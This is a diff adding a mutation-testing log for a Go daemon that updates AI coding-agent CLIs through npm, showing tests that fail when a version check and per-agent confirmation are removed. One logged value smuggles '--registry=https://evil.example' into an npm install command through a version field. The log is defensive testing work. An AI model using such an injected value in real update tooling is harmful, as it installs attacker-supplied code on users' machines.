@@ -1,0 +1,15 @@
+--- mutation 1: strict version check removed
+--- FAIL: TestCheckRefusesAVersionThatCouldCarryArguments (0.00s)
+    agentupdate_test.go:104: a malformed registry version reached a command: {Agent:{ID:codex Name:Codex CLI Binary:codex Package:@openai/codex} Path:/x/node_modules/@openai/codex/bin/codex.js Installed:0.100.0 Latest:9.9.9 --registry=https://evil.example Command:[npm install --global @openai/codex@9.9.9 --registry=https://evil.example] Note:}
+FAIL
+FAIL	github.com/flyfission/control-rod/daemon/internal/agentupdate	0.005s
+FAIL
+--- mutation 2: per-agent confirmation removed
+--- FAIL: TestUpdateRunsNothingWithoutYes (0.00s)
+    agents_test.go:32: ran [npm install --global @xai-official/grok@1.0.92 npm install --global opencode-ai@1.19.6] without a yes (exit 0)
+FAIL
+FAIL	github.com/flyfission/control-rod/daemon/cmd/controlrod	0.008s
+FAIL
+--- restored
+ok  	github.com/flyfission/control-rod/daemon/cmd/controlrod	0.007s
+ok  	github.com/flyfission/control-rod/daemon/internal/agentupdate	0.005s
